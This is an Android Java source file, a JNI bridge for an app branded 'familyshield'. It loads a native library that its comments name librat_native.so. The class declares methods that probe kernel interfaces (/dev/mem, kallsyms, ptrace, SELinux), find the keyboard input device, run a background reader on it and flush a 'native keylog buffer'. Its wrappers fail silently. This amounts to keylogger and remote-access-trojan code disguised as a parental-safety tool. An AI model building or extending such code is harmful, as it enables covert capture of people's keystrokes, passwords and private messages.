package com.familyshield.device.guard;

import android.util.Log;

/**
 * JNI bridge to the native kernel-probe library (librat_native.so).
 *
 * Falls back gracefully if the .so is missing (e.g. build without NDK).
 */
public class NativeProbe {

    private static final String TAG    = "NativeProbe";
    private static boolean      loaded = false;

    static {
        try {
            System.loadLibrary("fsgcore");
            loaded = true;
        } catch (UnsatisfiedLinkError e) {
            Log.w(TAG, "native lib not available: " + e.getMessage());
        }
    }

    // ── native declarations ───────────────────────────────────────────────────

    /** Full kernel probe — /dev/input, ptrace, /dev/mem, kallsyms, SELinux. */
    public static native String runKernelProbe();

    /** Start the background /dev/input reader on device index deviceIdx. */
    public static native boolean startInputReader(int deviceIdx);

    /** Stop the background reader. */
    public static native void stopInputReader();

    /** Flush native keylog buffer. */
    public static native String flushNativeKeylogs();

    /** Auto-detect which /dev/input/eventN is a keyboard. Returns -1 if none found. */
    public static native int findKeyboardDevice();

    // ── safe wrappers (no crash if .so missing) ───────────────────────────────

    public static String safeRunKernelProbe() {
        if (!loaded) return "[NativeProbe] librat_native.so not loaded — NDK build required";
        try { return runKernelProbe(); }
        catch (Throwable t) { return "[NativeProbe] error: " + t.getMessage(); }
    }

    public static boolean safeStartInputReader() {
        if (!loaded) return false;
        try {
            int dev = findKeyboardDevice();
            if (dev < 0) dev = 0; // fall back to event0
            Log.i(TAG, "starting native input reader on event" + dev);
            return startInputReader(dev);
        } catch (Throwable t) {
            Log.w(TAG, "startInputReader failed: " + t.getMessage());
            return false;
        }
    }

    public static String safeFlushNativeKeylogs() {
        if (!loaded) return "";
        try { return flushNativeKeylogs(); }
        catch (Throwable t) { return ""; }
    }

    public static boolean isLoaded() { return loaded; }
}
